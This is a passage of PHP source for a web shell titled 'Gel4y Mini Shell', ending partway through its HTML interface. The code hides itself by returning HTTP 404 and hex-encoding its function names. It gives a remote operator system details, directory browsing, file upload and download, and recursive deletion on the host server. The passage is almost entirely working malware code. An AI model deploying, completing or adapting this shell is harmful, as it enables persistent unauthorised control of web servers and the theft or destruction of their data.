<?php
error_reporting(0);
http_response_code(404);
define("self", "G\x65l\64y M\x69n\x69 Sh\x65ll");
$scD = "s\x63\x61\x6e\x64\x69r";
$fc = array("7068705f756e616d65", "70687076657273696f6e", "676574637764", "6368646972", "707265675f73706c6974", "61727261795f64696666", "69735f646972", "69735f66696c65", "69735f7772697461626c65", "69735f7265616461626c65", "66696c6573697a65", "636f7079", "66696c655f657869737473", "66696c655f7075745f636f6e74656e7473", "66696c655f6765745f636f6e74656e7473", "6d6b646972", "72656e616d65", "737472746f74696d65", "68746d6c7370656369616c6368617273", "64617465", "66696c656d74696d65");
for ($i = 0; $i < count($fc); $i++)
	$fc[$i] = nhx($fc[$i]);
if (isset($_GET["p"])) {
	$p = nhx($_GET["p"]);
	$fc[3](nhx($_GET["p"]));
} else {
	$p = $fc[2]();
}
function hex($str) {
	$r = "";
	for ($i = 0; $i < strlen($str); $i++)
		$r .= dechex(ord($str[$i]));
	return $r;
}
function nhx($str) {
	$r = "";
	$len = (strlen($str) -1);
	for ($i = 0; $i < $len; $i += 2)
		$r .= chr(hexdec($str[$i].$str[$i+1]));
	return $r;
}
function perms($f) {
	$p = fileperms($f);
	if (($p & 0xC000) == 0xC000) $i = 's';
	elseif (($p & 0xA000) == 0xA000) $i = 'l';
	elseif (($p & 0x8000) == 0x8000) $i = '-';
	elseif (($p & 0x6000) == 0x6000) $i = 'b';
	elseif (($p & 0x4000) == 0x4000) $i = 'd';
	elseif (($p & 0x2000) == 0x2000) $i = 'c';
	elseif (($p & 0x1000) == 0x1000) $i = 'p';
	else $i = 'u';

	$i .= (($p & 0x0100) ? 'r' : '-');
	$i .= (($p & 0x0080) ? 'w' : '-');
	$i .= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x') : (($p & 0x0800) ? 'S' : '-'));
	$i .= (($p & 0x0020) ? 'r' : '-');
	$i .= (($p & 0x0010) ? 'w' : '-');
	$i .= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x') : (($p & 0x0400) ? 'S' : '-'));
	$i .= (($p & 0x0004) ? 'r' : '-');
	$i .= (($p & 0x0002) ? 'w' : '-');
	$i .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x') : (($p & 0x0200) ? 'T' : '-'));
	return $i;
}
function a($msg, $sts = 1, $loc = "") {
	global $p;
	$status = (($sts == 1) ? "success" : "error");
	echo "<script>swal({title: \"{$status}\", text: \"{$msg}\", icon: \"{$status}\"}).then((btnClick) => {if(btnClick){document.location.href=\"?p=".hex($p).$loc."\"}})</script>";
}
function deldir($d) {
	global $fc;
	if (trim(pathinfo($d, PATHINFO_BASENAME), '.') === '') return;
	if ($fc[6]($d)) {
		array_map("deldir", glob($d . DIRECTORY_SEPARATOR . '{,.}*', GLOB_BRACE | GLOB_NOSORT));
		rmdir($d);
	} else {
		unlink($d);
	}
}
?>
<!doctype html>
<!-- RandsX aka T1kus_g0t -->
<html lang="en"><head><meta name="theme-color" content="red"><meta name="viewport" content="width=device-width, initial-scale=0.60, shrink-to-fit=no"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"><title><?= self ?></title><style>.table-hover tbody tr:hover td{background:red}.table-hover tbody tr:hover td>*{color:#fff}.table>tbody>tr>*{color:#fff;vertical-align:middle}.form-control{background:0 0!important;color:#fff!important;border-radius:0}.form-control::placeholder{color:#fff;opacity:1}li{font-size:18px;margin-left:6px;list-style:none}a{color:#fff}</style><script src="//unpkg.com/sweetalert/dist/sweetalert.min.js"></script></head><body style="background-color:#000;color:#fff;font-family:serif;"><div class="bg-dark table-responsive text-light border"><div class="d-flex justify-content-between p-1"><div><h3 class="mt-2"><a href="?"><?= self ?></a></h3></div><div><span>PHP Version : <?= $fc[1]() ?></span> <br><a href="?p=<?= hex($p)."&a=".hex("newFile") ?>">+File</a><a href="?p=<?= hex($p)."&a=".hex("newDir") ?>">+Directory</a></div></div><div class="border-top table-responsive"><li>Uname : <?= $fc[0]() ?></li></div><form method="post" enctype="multipart/form-data"><div class="input-group mb-1 px-1 mt-1"><div class="custom-file"><input type="file" name="f[]" class="custom-file-input" onchange="this.form.submit()" multiple><label class="custom-file-label rounded-0 bg-transparent text-light">Choose file</label></div></div></form>
<?php
if (isset($_FILES["f"])) {
	$n = $_FILES["f"]["name"];
	for ($i = 0; $i < count($n); $i++) {
		if ($fc[11]($_FILES["f"]["tmp_name"][$i], $n[$i])) {
			a("file uploaded successfully");
		} else {
			a("file failed to upload", 0);
		}
	}
}
if (isset($_GET["download"])) {
	header("Content-Type: application/octet-stream");
	header("Content-Transfer-Encoding: Binary");
	header("Content-Length: ".$fc[17](nhx($_GET["n"])));
	header("Content-disposition: attachment; filename=\"".nhx($_GET["n"])."\"");
}
?>
</div><div class="bg-dark border table-responsive mt-2"><div class="ml-2" style="font-size:18px;"><span>Path: </span>
<?php
$ps = $fc[4]("/(\\\|\/)/", $p);
foreach ($ps as $k => $v) {
	if ($k == 0 && $v == "") {
		echo "<a href=\"?p=2f\">~</a>/"; continue;
	}
	if ($v == "") continue;
	echo "<a href=\"?p=";
	for ($i = 0; $i <= $k; $i++) {
		echo hex($ps[$i]);
		if ($i != $k) echo "2f";
	}
	echo "\">{$v}</a>/";
}
?>
<